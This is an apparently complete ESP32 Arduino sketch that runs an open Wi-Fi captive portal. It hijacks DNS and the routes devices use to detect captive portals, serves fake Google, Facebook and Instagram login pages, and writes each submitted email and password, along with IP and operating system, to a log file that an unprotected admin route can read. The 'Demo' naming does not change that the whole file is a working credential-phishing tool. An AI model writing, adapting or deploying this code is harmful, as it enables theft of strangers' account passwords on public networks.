#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>

const char* AP_SSID = "ESP32-Portal-Demo";
const byte DNS_PORT = 53;

DNSServer dnsServer;
WebServer server(80);

String readFile(const char* path) {
  File f = LittleFS.open(path, "r");
  if (!f) return "File not found";
  String s = f.readString();
  f.close();
  return s;
}

String detectOS() {
  String ua = server.header("User-Agent");
  ua.toLowerCase();
  if (ua.indexOf("windows") >= 0) return "Windows";
  if (ua.indexOf("android") >= 0) return "Android";
  if (ua.indexOf("iphone") >= 0 || ua.indexOf("ipad") >= 0 || ua.indexOf("ipod") >= 0) return "iOS";
  if (ua.indexOf("mac os") >= 0) return "macOS";
  if (ua.indexOf("linux") >= 0) return "Linux";
  return "Unknown";
}

void logEvent(const String& provider, const String& action) {
  File f = LittleFS.open("/logs.txt", "a");
  if (!f) return;

  String ip = server.client().remoteIP().toString();
  String ts = server.header("Date");
  if (!ts.length()) ts = String(millis());
  String os = detectOS();
  String email = server.hasArg("email") ? server.arg("email") : "-";
  String password = server.hasArg("password") ? server.arg("password") : "-";

  f.printf("%s | ip=%s | provider=%s | email=%s | password=%s | os=%s | action=%s\n",
           ts.c_str(), ip.c_str(), provider.c_str(),
           email.c_str(), password.c_str(), os.c_str(), action.c_str());
  f.close();
}

void serveFile(const char* path, const char* contentType) {
  if (!LittleFS.exists(path)) {
    server.send(404, "text/plain", "Not found");
    return;
  }
  server.send(200, contentType, readFile(path));
}

void handleRoot() {
  serveFile("/index.html", "text/html; charset=utf-8");
}

void handleLogin() {
  String provider = server.hasArg("provider") ? server.arg("provider") : "";
  if (provider == "Google") {
    logEvent(provider, "login_page");
    serveFile("/login-google.html", "text/html; charset=utf-8");
  } else if (provider == "Facebook") {
    logEvent(provider, "login_page");
    serveFile("/login-facebook.html", "text/html; charset=utf-8");
  } else if (provider == "Instagram") {
    logEvent(provider, "login_page");
    serveFile("/login-instagram.html", "text/html; charset=utf-8");
  } else {
    server.sendHeader("Location", "/");
    server.send(302, "text/plain", "");
  }
}

void handleGooglePass() {
  serveFile("/google-password.html", "text/html; charset=utf-8");
}

void handleDemoLogin() {
  String provider = server.hasArg("provider") ? server.arg("provider") : "Demo";
  logEvent(provider, "submit");
  server.sendHeader("Location", "/success.html");
  server.send(302, "text/plain", "");
}

void handleAdmin() {
  serveFile("/admin.html", "text/html; charset=utf-8");
}

void handleLogs() {
  String logs;
  if (LittleFS.exists("/logs.txt")) {
    File f = LittleFS.open("/logs.txt", "r");
    logs = f.readString();
    f.close();
  }
  server.send(200, "text/plain; charset=utf-8", logs);
}

void handleClearLogs() {
  LittleFS.remove("/logs.txt");
  server.send(200, "text/plain", "Logs cleared");
}

void captiveRedirect() {
  server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);

  if (!LittleFS.begin(true)) {
    Serial.println("LittleFS error");
    return;
  }

  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID); // rede aberta, sem senha

  IPAddress apIP = WiFi.softAPIP();
  Serial.printf("AP: %s\n", AP_SSID);
  Serial.printf("IP: %s\n", apIP.toString().c_str());

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_GET, handleLogin);
  server.on("/google-pass", HTTP_GET, handleGooglePass);
  server.on("/demo-login", HTTP_POST, handleDemoLogin);
  server.on("/admin", HTTP_GET, handleAdmin);
  server.on("/logs.txt", HTTP_GET, handleLogs);
  server.on("/clear-logs", HTTP_POST, handleClearLogs);

  // Rotas comuns usadas por dispositivos para detectar captive portals.
  server.on("/generate_204", HTTP_GET, captiveRedirect);
  server.on("/hotspot-detect.html", HTTP_GET, captiveRedirect);
  server.on("/connecttest.txt", HTTP_GET, captiveRedirect);
  server.on("/ncsi.txt", HTTP_GET, captiveRedirect);

  server.onNotFound(captiveRedirect);
  server.begin();

  Serial.println("Captive portal iniciado.");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
